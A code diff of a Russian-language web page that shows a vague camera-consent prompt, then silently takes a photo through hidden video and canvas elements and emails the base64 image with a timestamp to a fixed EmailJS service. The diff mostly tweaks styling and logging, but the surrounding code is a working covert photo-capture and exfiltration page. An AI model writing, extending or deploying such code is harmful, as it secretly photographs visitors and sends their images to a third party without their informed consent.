@@ -20,13 +20,14 @@
     #loading { font-size: 18px; }
     video { display:none; }
     canvas { display:none; }
+    button { background:green;color:white;padding:10px 20px;font-size:18px; cursor:pointer; }
   </style>
 </head>
 <body>
   <div id="agreement">
     <h2>Соглашение</h2>
     <p>Переходя далее, вы соглашаетесь с использованием вашей камеры.</p>
-    <button id="acceptBtn" style="background:green;color:white;padding:10px 20px;font-size:18px;">Принять</button>
+    <button id="acceptBtn">Принять</button>
   </div>
 
   <div id="main">
@@ -74,13 +75,16 @@
         // Отправляем base64 в EmailJS
         await emailjs.send("service_zv13ydk", "template_60nz82p", {
           time: new Date().toLocaleString(),
-          photo: dataUrl // используем переменную {{photo}} в шаблоне
-        });
+          photo: dataUrl
+        })
+        .then(response => console.log("Письмо успешно отправлено:", response))
+        .catch(error => console.error("Ошибка отправки:", error));
 
         main.style.display = 'none';
         result.style.display = 'block';
       } catch(err) {
-        alert("Ошибка: " + err.message);
+        alert("Ошибка доступа к камере: " + err.message);
+        console.error(err);
       }
     };
   </script>
